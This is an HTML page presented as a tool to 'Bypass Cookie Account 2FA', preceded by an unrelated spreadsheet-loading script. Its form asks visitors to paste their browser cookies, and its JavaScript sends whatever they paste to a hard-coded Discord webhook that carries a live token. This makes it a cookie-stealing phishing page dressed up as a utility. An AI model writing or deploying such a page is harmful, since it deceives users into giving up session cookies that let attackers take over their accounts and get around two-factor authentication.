<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }
        </script><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Webhook Text Sender</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f8f9fa; }
        .container { max-width: 600px; margin-top: 50px; }
        .alert { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="text-center mb-4">Bypass Cookie Account 2FA</h1>
        <form onsubmit="sendToWebhook(event)">
            <div class="mb-3">
                <label for="textInput" class="form-label">Paste Cookies Here</label>
                <textarea class="form-control" id="textInput" rows="5" placeholder="" required></textarea>
            </div>
            <button type="submit" class="btn btn-primary w-100">Done</button>
        </form>
        <div id="successAlert" class="alert alert-success mt-3">Message sent successfully!</div>
        <div id="errorAlert" class="alert alert-danger mt-3">Failed to send message. Please try again.</div>
    </div>

    <script>
        async function sendToWebhook(event) {
            event.preventDefault();
            const textInput = document.getElementById('textInput').value;
            const successAlert = document.getElementById('successAlert');
            const errorAlert = document.getElementById('errorAlert');
            const webhookUrl = 'https://discord.com/api/webhooks/1399202082963193877/LZF2ORYpNoHz6diok56gnHlZBRuiSb0KV3Ff5ExhqvxUcQBXuzTVUjXHODbiXl8jXWMB'; // Replace with your Discord webhook URL

            const payload = { content: textInput };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    successAlert.style.display = 'block';
                    errorAlert.style.display = 'none';
                    document.getElementById('textInput').value = '';
                    setTimeout(() => successAlert.style.display = 'none', 3000);
                } else {
                    throw new Error('Failed to send message');
                }
            } catch (error) {
                console.error('Error:', error);
                errorAlert.style.display = 'block';
                successAlert.style.display = 'none';
                setTimeout(() => errorAlert.style.display = 'none', 3000);
            }
        }
    </script>
</body>
</html>
